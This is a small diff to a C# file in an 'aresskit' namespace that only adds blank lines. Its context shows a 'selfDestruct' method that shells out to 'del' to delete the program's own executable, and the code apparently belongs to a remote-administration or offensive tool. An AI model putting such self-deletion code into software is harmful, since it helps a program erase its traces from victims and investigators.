@@ -60,6 +60,8 @@ namespace aresskit
             return base64EncodedBytes;
         }
 
+        
+
         public static string selfDestruct()
         { return exec("del " + System.Reflection.Assembly.GetEntryAssembly().Location); } // use 'del' command to delete self
 
